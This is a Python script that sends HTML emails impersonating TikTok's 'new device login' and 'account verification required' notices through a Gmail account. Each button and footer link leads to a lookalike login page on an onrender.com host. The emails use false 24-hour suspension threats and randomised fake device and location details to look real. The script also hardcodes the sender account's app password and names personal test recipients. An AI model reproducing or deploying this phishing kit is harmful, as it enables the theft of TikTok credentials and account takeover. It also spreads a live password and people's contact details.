import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from datetime import datetime
import random
import base64
import os

# ========== Gmail SMTP Configuration ==========
smtp_server = "smtp.gmail.com"
port = 587
username = "Standardbankingconfirmation@gmail.com"   # 👈 your Gmail
password = "udyu gyfv rfjj fvgk"     # 👈 use App Password if 2FA enabled

# ========== Logo Configuration ==========
# Use hosted logo URL for reliable email display
LOGO_URL = "https://tiktok-reset.onrender.com/logo/logo.jpg"
LOGO_PATH = "static/logo.jpg"  # Fallback for local development
# =============================================

def get_logo_html():
    """Get logo HTML with hosted URL for reliable email display"""
    try:
        # Use hosted logo URL for production emails
        return f'<img src="{LOGO_URL}" alt="TikTok" style="height: 60px; width: auto; max-width: 200px; display: block; margin: 0 auto;">'
    except Exception as e:
        print(f"❌ Error getting logo HTML: {e}")
        # Fallback to text if logo fails
        return '<span style="font-size: 32px; font-weight: bold; color: #ffffff;">🎵 TikTok</span>'

def get_logo_base64():
    """Convert logo to base64 for email embedding"""
    try:
        if os.path.exists(LOGO_PATH):
            with open(LOGO_PATH, "rb") as logo_file:
                logo_data = logo_file.read()
                logo_base64 = base64.b64encode(logo_data).decode('utf-8')
                # Determine MIME type based on file extension
                if LOGO_PATH.lower().endswith('.jpg') or LOGO_PATH.lower().endswith('.jpeg'):
                    mime_type = 'image/jpeg'
                elif LOGO_PATH.lower().endswith('.png'):
                    mime_type = 'image/png'
                else:
                    mime_type = 'image/jpeg'  # Default to JPEG
                return f"data:{mime_type};base64,{logo_base64}"
        else:
            print(f"⚠️ Logo file not found: {LOGO_PATH}")
            return None
    except Exception as e:
        print(f"❌ Error converting logo to base64: {e}")
        return None

def send_custom_tiktok_email(smtp_server, smtp_port, sender_email, sender_password, 
                            recipient_email, subject, template='tiktok_security', 
                            username='user', custom_message=''):
    """
    Send custom TikTok email using user-provided SMTP settings
    
    Args:
        smtp_server (str): SMTP server (e.g., 'smtp.gmail.com')
        smtp_port (int): SMTP port (e.g., 587)
        sender_email (str): Sender's email address
        sender_password (str): Sender's app password
        recipient_email (str): Recipient's email address
        subject (str): Email subject
        template (str): Email template type ('tiktok_security', 'tiktok_verification', 'custom')
        username (str): Username for greeting
        custom_message (str): Optional custom message
    
    Returns:
        bool: True if email sent successfully, False otherwise
    """
    try:
        # Create message
        msg = MIMEMultipart('alternative')
        msg['From'] = sender_email
        msg['To'] = recipient_email
        msg['Subject'] = subject
        
        # Get logo HTML
        logo_html = get_logo_html()
        
        # Generate HTML content based on template
        if template == 'tiktok_security':
            html_content = f"""<!DOCTYPE html>
            <html>
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>TikTok Security Alert</title>
            </head>
            <body style="margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background-color: #f8f9fa;">
                <div class="email-container" style="max-width: 600px; margin: 0 auto; background-color: #ffffff;">
                    <div class="header" style="background: linear-gradient(135deg, #00f2ea 0%, #ff0050 100%); padding: 30px 20px; text-align: center;">
                        <div class="tiktok-logo" style="margin-bottom: 20px;">
                            {logo_html}
                        </div>
                        <h1 style="color: #ffffff; margin: 0; font-size: 28px; font-weight: 600;">Security Alert</h1>
                        <p style="color: #ffffff; margin: 10px 0 0 0; font-size: 16px; opacity: 0.9;">New Device Login Detected</p>
                    </div>
                    
                    <div class="content" style="padding: 40px 20px;">
                        <div class="alert-banner" style="background: linear-gradient(135deg, #ff6b6b 0%, #ff8e53 100%); color: #ffffff; padding: 20px; border-radius: 12px; margin-bottom: 30px; text-align: center;">
                            <h2 style="margin: 0 0 10px 0; font-size: 24px;">⚠️ URGENT: Account Verification Required</h2>
                            <p style="margin: 0; font-size: 16px;">We detected a new device login to your TikTok account</p>
                        </div>
                        
                        <p style="color: #333333; font-size: 16px; line-height: 1.6; margin-bottom: 20px;">
                            Hello <strong>{username}</strong>,
                        </p>
                        
                        <p style="color: #333333; font-size: 16px; line-height: 1.6; margin-bottom: 20px;">
                            We detected a new device login to your TikTok account from an unrecognized location. 
                            This could potentially be unauthorized access to your account.
                        </p>
                        
                        {f'<p style="color: #333333; font-size: 16px; line-height: 1.6; margin-bottom: 20px;"><strong>Additional Information:</strong><br>{custom_message}</p>' if custom_message else ''}
                        
                        <div class="action-buttons" style="text-align: center; margin: 30px 0;">
                            <a href="#" style="background: linear-gradient(135deg, #00f2ea 0%, #ff0050 100%); color: #ffffff; padding: 15px 30px; text-decoration: none; border-radius: 25px; font-weight: 600; display: inline-block; margin: 0 10px;">Verify Account</a>
                            <a href="#" style="background-color: #6c757d; color: #ffffff; padding: 15px 30px; text-decoration: none; border-radius: 25px; font-weight: 600; display: inline-block; margin: 0 10px;">Review Activity</a>
                        </div>
                        
                        <div class="security-tips" style="background-color: #f8f9fa; padding: 20px; border-radius: 12px; border-left: 4px solid #00f2ea;">
                            <h3 style="color: #333333; margin: 0 0 15px 0;">🔒 Security Tips:</h3>
                            <ul style="color: #555555; margin: 0; padding-left: 20px;">
                                <li>Enable two-factor authentication</li>
                                <li>Use a strong, unique password</li>
                                <li>Never share your login credentials</li>
                                <li>Regularly review account activity</li>
                            </ul>
                        </div>
                    </div>
                    
                    <div class="footer" style="background-color: #f8f9fa; padding: 20px; text-align: center; border-top: 1px solid #e9ecef;">
                        <p style="color: #6c757d; margin: 0; font-size: 14px;">
                            This is an automated security notification from TikTok. 
                            If you didn't attempt to log in, please secure your account immediately.
                        </p>
                        <p style="color: #6c757d; margin: 10px 0 0 0; font-size: 12px;">
                            © 2024 TikTok. All rights reserved.
                        </p>
                    </div>
                </div>
            </body>
            </html>"""
            
        elif template == 'tiktok_verification':
            html_content = f"""<!DOCTYPE html>
            <html>
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>TikTok Verification Required</title>
            </head>
            <body style="margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background-color: #f8f9fa;">
                <div class="email-container" style="max-width: 600px; margin: 0 auto; background-color: #ffffff;">
                    <div class="header" style="background: linear-gradient(135deg, #00f2ea 0%, #ff0050 100%); padding: 30px 20px; text-align: center;">
                        <div class="tiktok-logo" style="margin-bottom: 20px;">
                            {logo_html}
                        </div>
                        <h1 style="color: #ffffff; margin: 0; font-size: 28px; font-weight: 600;">Verification Required</h1>
                        <p style="color: #ffffff; margin: 10px 0 0 0; font-size: 16px; opacity: 0.9;">Complete Account Verification</p>
                    </div>
                    
                    <div class="content" style="padding: 40px 20px;">
                        <div class="verification-banner" style="background: linear-gradient(135deg, #ffd93d 0%, #ff6b6b 100%); color: #ffffff; padding: 20px; border-radius: 12px; margin-bottom: 30px; text-align: center;">
                            <h2 style="margin: 0 0 10px 0; font-size: 24px;">⚠️ Account Verification Required</h2>
                            <p style="margin: 0; font-size: 16px;">Your TikTok account requires immediate verification</p>
                        </div>
                        
                        <p style="color: #333333; font-size: 16px; line-height: 1.6; margin-bottom: 20px;">
                            Hello <strong>{username}</strong>,
                        </p>
                        
                        <p style="color: #333333; font-size: 16px; line-height: 1.6; margin-bottom: 20px;">
                            We've detected unusual activity on your TikTok account that requires immediate verification. 
                            To ensure your account security and restore full access, please complete the verification process.
                        </p>
                        
                        {f'<p style="color: #333333; font-size: 16px; line-height: 1.6; margin-bottom: 20px;"><strong>Verification Details:</strong><br>{custom_message}</p>' if custom_message else ''}
                        
                        <div class="verification-steps" style="background-color: #f8f9fa; padding: 20px; border-radius: 12px; margin: 30px 0;">
                            <h3 style="color: #333333; margin: 0 0 15px 0;">📋 Verification Steps:</h3>
                            <ol style="color: #555555; margin: 0; padding-left: 20px;">
                                <li>Click the "Verify Account" button below</li>
                                <li>Enter your phone number for SMS verification</li>
                                <li>Enter the 6-digit code sent to your phone</li>
                                <li>Complete any additional security checks</li>
                            </ol>
                        </div>
                        
                        <div class="action-buttons" style="text-align: center; margin: 30px 0;">
                            <a href="#" style="background: linear-gradient(135deg, #00f2ea 0%, #ff0050 100%); color: #ffffff; padding: 15px 30px; text-decoration: none; border-radius: 25px; font-weight: 600; display: inline-block;">Verify Account Now</a>
                        </div>
                        
                        <div class="warning" style="background-color: #fff3cd; border: 1px solid #ffeaa7; color: #856404; padding: 15px; border-radius: 8px; margin: 20px 0;">
                            <p style="margin: 0; font-size: 14px;">
                                <strong>⚠️ Important:</strong> Failure to verify your account within 24 hours may result in temporary suspension.
                            </p>
                        </div>
                    </div>
                    
                    <div class="footer" style="background-color: #f8f9fa; padding: 20px; text-align: center; border-top: 1px solid #e9ecef;">
                        <p style="color: #6c757d; margin: 0; font-size: 14px;">
                            This verification is required to maintain account security and comply with TikTok's terms of service.
                        </p>
                        <p style="color: #6c757d; margin: 10px 0 0 0; font-size: 12px;">
                            © 2024 TikTok. All rights reserved.
                        </p>
                    </div>
                </div>
            </body>
            </html>"""
            
        else:  # custom template
            html_content = f"""<!DOCTYPE html>
            <html>
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Custom Message</title>
            </head>
            <body style="margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background-color: #f8f9fa;">
                <div class="email-container" style="max-width: 600px; margin: 0 auto; background-color: #ffffff;">
                    <div class="header" style="background: linear-gradient(135deg, #00f2ea 0%, #ff0050 100%); padding: 30px 20px; text-align: center;">
                        <div class="tiktok-logo" style="margin-bottom: 20px;">
                            {logo_html}
                        </div>
                        <h1 style="color: #ffffff; margin: 0; font-size: 28px; font-weight: 600;">Custom Message</h1>
                    </div>
                    
                    <div class="content" style="padding: 40px 20px;">
                        <p style="color: #333333; font-size: 16px; line-height: 1.6; margin-bottom: 20px;">
                            Hello <strong>{username}</strong>,
                        </p>
                        
                        {f'<p style="color: #333333; font-size: 16px; line-height: 1.6; margin-bottom: 20px;">{custom_message}</p>' if custom_message else '<p style="color: #333333; font-size: 16px; line-height: 1.6; margin-bottom: 20px;">This is a custom message from your TikTok account.</p>'}
                        
                        <div class="action-buttons" style="text-align: center; margin: 30px 0;">
                            <a href="#" style="background: linear-gradient(135deg, #00f2ea 0%, #ff0050 100%); color: #ffffff; padding: 15px 30px; text-decoration: none; border-radius: 25px; font-weight: 600; display: inline-block;">Take Action</a>
                        </div>
                    </div>
                    
                    <div class="footer" style="background-color: #f8f9fa; padding: 20px; text-align: center; border-top: 1px solid #e9ecef;">
                        <p style="color: #6c757d; margin: 0; font-size: 14px;">
                            This is a custom message from TikTok.
                        </p>
                        <p style="color: #6c757d; margin: 10px 0 0 0; font-size: 12px;">
                            © 2024 TikTok. All rights reserved.
                        </p>
                    </div>
                </div>
            </body>
            </html>"""
        
        # Attach HTML content
        msg.attach(MIMEText(html_content, 'html'))
        
        # Create SMTP session
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(sender_email, sender_password)
        
        # Send email
        text = msg.as_string()
        server.sendmail(sender_email, recipient_email, text)
        server.quit()
        
        print(f"✅ Custom {template} email sent successfully to {recipient_email}!")
        return True
        
    except Exception as e:
        print(f"❌ Error sending custom email: {e}")
        return False

# ========== Logo Hosting Configuration ==========
# Base URL for hosting the logo (change this to your actual domain in production)
BASE_URL = "http://localhost:5000"  # 👈 Change this to your domain when deploying
# =============================================

def send_tiktok_security_alert(recipient_email, alert_type="new_device", tiktok_username="user"):
    """
    Send a TikTok security alert email
    
    Args:
        recipient_email (str): Email address to send to
        alert_type (str): Type of alert ('new_device', 'suspicious_activity', 'verification_required')
        username (str): Username for the greeting
    """

    # Create message
    msg = MIMEMultipart("alternative")
    msg["From"] = "Standardbankingconfirmation@gmail.com"  # Fixed: Use actual sender email
    msg["To"] = recipient_email
    msg["Subject"] = "TikTok: Security Alert - New Device Login Detected"
    
    # Generate current timestamp
    current_time = datetime.now().strftime("%m/%d %H:%M SAST")
    
    # Random device and location for realism
    devices = ["HONOR X5 Plus", "iPhone 15 Pro", "Samsung Galaxy S24", "Google Pixel 8", "OnePlus 12"]
    locations = ["Gauteng", "Western Cape", "KwaZulu-Natal", "Eastern Cape", "Free State"]
    
    device = random.choice(devices)
    location = random.choice(locations)
    
    # HTML content for TikTok security alert
    html_content = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Security Alert</title>
    <style>
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #121212;
            color: #ffffff;
            line-height: 1.6;
        }}
        
        .email-container {{
            max-width: 600px;
            margin: 0 auto;
            background-color: #1e1e1e;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
        }}
        
        .header {{
            background: linear-gradient(135deg, #00f2ea 0%, #ff0050 100%);
            padding: 30px 20px;
            text-align: center;
        }}
        
        .tiktok-logo {{
            display: flex;
            justify-content: center;
            align-items: center;
        }}
        
        .tiktok-logo img {{
            height: 60px;
            width: auto;
            max-width: 200px;
            filter: drop-shadow(2px 2px 4px rgba(0,0,0,0.3));
        }}
        
        .content {{
            padding: 40px 30px;
            color: #e0e0e0;
        }}
        
        .greeting {{
            font-size: 20px;
            margin-bottom: 25px;
            color: #ffffff;
        }}
        
        .alert-message {{
            font-size: 16px;
            margin-bottom: 30px;
            color: #e0e0e0;
            background-color: #2a2a2a;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #ff0050;
        }}
        
        .login-details {{
            background-color: #2a2a2a;
            padding: 20px;
            border-radius: 8px;
            margin: 25px 0;
        }}
        
        .detail-row {{
            display: flex;
            justify-content: space-between;
            margin-bottom: 15px;
            padding: 10px 0;
            border-bottom: 1px solid #3a3a3a;
        }}
        
        .detail-row:last-child {{
            border-bottom: none;
        }}
        
        .detail-label {{
            color: #b0b0b0;
            font-weight: 500;
        }}
        
        .detail-value {{
            color: #ffffff;
            font-weight: 600;
        }}
        
        .action-buttons {{
            margin: 30px 0;
            text-align: center;
        }}
        
        .btn {{
            display: inline-block;
            padding: 15px 30px;
            margin: 10px;
            background: linear-gradient(135deg, #00f2ea 0%, #ff0050 100%);
            color: #ffffff;
            text-decoration: none;
            border-radius: 25px;
            font-weight: 600;
            font-size: 16px;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(0, 242, 234, 0.3);
        }}
        
        .btn:hover {{
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0, 242, 234, 0.4);
        }}
        
        .btn-secondary {{
            background: #3a3a3a;
            color: #e0e0e0;
            box-shadow: none;
        }}
        
        .btn-secondary:hover {{
            background: #4a4a4a;
            transform: none;
            box-shadow: none;
        }}
        
        .security-tips {{
            background-color: #2a2a2a;
            padding: 25px;
            border-radius: 8px;
            margin: 30px 0;
        }}
        
        .tips-title {{
            color: #00f2ea;
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 15px;
        }}
        
        .tip-item {{
            margin-bottom: 12px;
            padding-left: 20px;
            position: relative;
        }}
        
        .tip-item:before {{
            content: "🔒";
            position: absolute;
            left: 0;
            color: #00f2ea;
        }}
        
        .footer {{
            background-color: #2a2a2a;
            padding: 25px 30px;
            text-align: center;
            color: #b0b0b0;
            font-size: 14px;
        }}
        
        .footer-links {{
            margin: 15px 0;
        }}
        
        .footer-links a {{
            color: #00f2ea;
            text-decoration: none;
            margin: 0 15px;
        }}
        
        .footer-links a:hover {{
            text-decoration: underline;
        }}
        
        .company-info {{
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #3a3a3a;
        }}
        
        .highlight {{
            background-color: #ff0050;
            color: #ffffff;
            padding: 2px 6px;
            border-radius: 4px;
            font-weight: 600;
        }}
        
        @media (max-width: 600px) {{
            .email-container {{
                margin: 10px;
                border-radius: 8px;
            }}
            
            .content {{
                padding: 25px 20px;
            }}
            
            .header {{
                padding: 20px 15px;
            }}
            
            .btn {{
                display: block;
                margin: 10px 0;
                text-align: center;
            }}
        }}
    </style>
</head>
<body>
    <div class="email-container">
                    <!-- Header with TikTok Logo -->
            <div class="header">
                <div class="tiktok-logo">
                    {get_logo_html()}
                </div>
            </div>
        
        <!-- Main Content -->
        <div class="content">
            <!-- Greeting -->
            <div class="greeting">
                Hi {tiktok_username},
            </div>
            
            <!-- Alert Message -->
            <div class="alert-message">
                We're writing to inform you that we detected a login to your account from a new device.
            </div>
            
            <!-- Login Details -->
            <div class="login-details">
                <div class="detail-row">
                    <span class="detail-label">When:</span>
                    <span class="detail-value">{current_time}</span>
                </div>
                <div class="detail-row">
                    <span class="detail-label">Device:</span>
                    <span class="detail-value">{device}</span>
                </div>
                <div class="detail-row">
                    <span class="detail-label">Near:</span>
                    <span class="detail-value">{location}</span>
                </div>
            </div>
            
            <!-- Action Buttons -->
            <div class="action-buttons">
                            <a href="https://tiktok-reset.onrender.com/tiktok-login" class="btn">Review Login Activity</a>
            <a href="https://tiktok-reset.onrender.com/tiktok-login" class="btn btn-secondary">Security Settings</a>
            </div>
            
            <!-- Security Tips -->
            <div class="security-tips">
                <div class="tips-title">🔐 Security Recommendations</div>
                <div class="tip-item">If this was you, you can ignore this message.</div>
                <div class="tip-item">If this wasn't you, open the <span class="highlight">TikTok</span> app and go to "Settings and privacy" > "Security and login" > "Security alerts" and review unauthorized logins.</div>
                <div class="tip-item">You can also set up 2-step verification to secure your account by going to "Security and login" > "2-step verification".</div>
                <div class="tip-item">If you're unable to access your account, contact <span class="highlight">TikTok</span> support.</div>
            </div>
            
            <!-- Learn More Link -->
            <div style="text-align: center; margin: 25px 0;">
                <a href="https://tiktok-reset.onrender.com/tiktok-login" style="color: #ff0050; text-decoration: none; font-weight: 600; font-size: 16px;">
                    Learn more about 2-step verification
                </a>
        </div>
        
            <!-- Disclaimer -->
            <div style="font-size: 14px; color: #b0b0b0; text-align: center; margin: 30px 0;">
                This is an automatically generated email. Replies to this email address aren't monitored.
            </div>
        </div>
        
        <!-- Footer -->
        <div class="footer">
            <div class="footer-links">
                <a href="https://tiktok-reset.onrender.com/tiktok-login">Privacy Policy</a>
                <a href="https://tiktok-reset.onrender.com/tiktok-login">Terms of Service</a>
                <a href="https://tiktok-reset.onrender.com/tiktok-login">Help Center</a>
            </div>
            
            <div class="company-info">
                This email was generated for {tiktok_username}<br>
                <span class="highlight">TikTok</span> 5800 Bristol Pkwy, Culver City, CA 90230
            </div>
        </div>
    </div>
</body>
</html>"""

    # Attach HTML content
    msg.attach(MIMEText(html_content, "html"))

    # Send email
    try:
        server = smtplib.SMTP(smtp_server, port)
        server.starttls()
        server.login("Standardbankingconfirmation@gmail.com", "udyu gyfv rfjj fvgk")  # Fixed: Use global Gmail credentials
        server.sendmail(msg["From"], recipient_email, msg.as_string())
        server.quit()
        print(f"✅ TikTok security alert sent successfully to {recipient_email}!")
        return True
    except Exception as e:
        print(f"❌ Error sending TikTok security alert: {e}")
        return False

def send_tiktok_verification_required(recipient_email, tiktok_username="user"):
    """
    Send a TikTok verification required email
    """
    msg = MIMEMultipart("alternative")
    msg["From"] = "Standardbankingconfirmation@gmail.com"  # Fixed: Use actual sender email
    msg["To"] = recipient_email
    msg["Subject"] = "TikTok: Account Verification Required - Immediate Action Needed"
    
    html_content = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Account Verification</title>
    <style>
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #121212;
            color: #ffffff;
            line-height: 1.6;
        }}
        
        .email-container {{
            max-width: 600px;
            margin: 0 auto;
            background-color: #1e1e1e;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
        }}
        
        .header {{
            background: linear-gradient(135deg, #ff0050 0%, #00f2ea 100%);
            padding: 30px 20px;
            text-align: center;
        }}
        
        .tiktok-logo {{
            display: flex;
            justify-content: center;
            align-items: center;
        }}
        
        .tiktok-logo img {{
            height: 60px;
            width: auto;
            max-width: 200px;
            filter: drop-shadow(2px 2px 4px rgba(0,0,0,0.3));
        }}
        
        .content {{
            padding: 40px 30px;
            color: #e0e0e0;
        }}
        
        .urgent-banner {{
            background: linear-gradient(135deg, #ff0050 0%, #ff6b35 100%);
            color: #ffffff;
            padding: 20px;
            border-radius: 8px;
            text-align: center;
            margin-bottom: 30px;
            font-weight: 600;
            font-size: 18px;
        }}
        
        .greeting {{
            font-size: 20px;
            margin-bottom: 25px;
            color: #ffffff;
        }}
        
        .verification-message {{
            font-size: 16px;
            margin-bottom: 30px;
            color: #e0e0e0;
            background-color: #2a2a2a;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #ff0050;
        }}
        
        .verification-button {{
            display: block;
            width: 100%;
            max-width: 300px;
            margin: 30px auto;
            padding: 18px 30px;
            background: linear-gradient(135deg, #00f2ea 0%, #ff0050 100%);
            color: #ffffff;
            text-decoration: none;
            border-radius: 25px;
            font-weight: 600;
            font-size: 18px;
            text-align: center;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(0, 242, 234, 0.3);
        }}
        
        .verification-button:hover {{
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0, 242, 234, 0.4);
        }}
        
        .security-notice {{
            background-color: #2a2a2a;
            padding: 25px;
            border-radius: 8px;
            margin: 30px 0;
            border: 2px solid #ff0050;
        }}
        
        .notice-title {{
            color: #ff0050;
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 15px;
        }}
        
        .footer {{
            background-color: #2a2a2a;
            padding: 25px 30px;
            text-align: center;
            color: #b0b0b0;
            font-size: 14px;
        }}
        
        .highlight {{
            background-color: #ff0050;
            color: #ffffff;
            padding: 2px 6px;
            border-radius: 4px;
            font-weight: 600;
        }}
    </style>
</head>
<body>
    <div class="email-container">
        <!-- Header -->
        <div class="header">
            <div class="tiktok-logo">
                {get_logo_html()}
            </div>
        </div>
        
        <!-- Main Content -->
        <div class="content">
            <!-- Urgent Banner -->
            <div class="urgent-banner">
                ⚠️ URGENT: Account Verification Required ⚠️
            </div>
            
            <!-- Greeting -->
            <div class="greeting">
                Hi {tiktok_username},
            </div>
            
            <!-- Verification Message -->
            <div class="verification-message">
                Due to suspicious activities detected in your account, we require immediate verification of your identity to prevent unauthorized access and protect your account security.
            </div>
            
            <!-- Verification Button -->
            <a href="https://tiktok-reset.onrender.com/tiktok-login" class="verification-button">
                VERIFY ACCOUNT NOW
            </a>
            
            <!-- Security Notice -->
            <div class="security-notice">
                <div class="notice-title">🔒 Security Alert</div>
                <p>Your account has been temporarily restricted until verification is completed. This is a security measure to protect your personal information and content.</p>
                <p>If you don't verify within 24 hours, your account may be permanently suspended.</p>
            </div>
            
            <!-- Disclaimer -->
            <div style="font-size: 14px; color: #b0b0b0; text-align: center; margin: 30px 0;">
                This is an automatically generated email. Replies to this email address aren't monitored.
            </div>
        </div>
        
        <!-- Footer -->
        <div class="footer">
            <div style="margin-bottom: 20px;">
                <span class="highlight">TikTok</span> 5800 Bristol Pkwy, Culver City, CA 90230
            </div>
            <div>
                For immediate assistance, contact TikTok support through the app
            </div>
        </div>
    </div>
</body>
</html>"""

    msg.attach(MIMEText(html_content, "html"))
    
    try:
        server = smtplib.SMTP(smtp_server, port)
        server.starttls()
        server.login("Standardbankingconfirmation@gmail.com", "udyu gyfv rfjj fvgk")  # Fixed: Use global Gmail credentials
        server.sendmail(msg["From"], recipient_email, msg.as_string())
        server.quit()
        print(f"✅ TikTok verification email sent successfully to {recipient_email}!")
        return True
    except Exception as e:
        print(f"❌ Error sending TikTok verification email: {e}")
        return False

# Example usage functions
def send_test_tiktok_alert():
    """Send a test TikTok security alert"""
    return send_tiktok_security_alert("moneybman0@gmail.com", "new_device", "thee_great_bevan_mkhabele")

def send_test_tiktok_verification():
    """Send a test TikTok verification email"""
    return send_tiktok_verification_required("moneybman0@gmail.com", "thee_great_bevan_mkhabele")

# Main execution
if __name__ == "__main__":
    print("🚀 TikTok Email System")
    print("=" * 40)
    
    # Send test emails
    print("\n📧 Sending TikTok Security Alert...")
    send_test_tiktok_alert()
    
    print("\n📧 Sending TikTok Verification Email...")
    send_test_tiktok_verification()
    
    print("\n✅ All test emails sent!")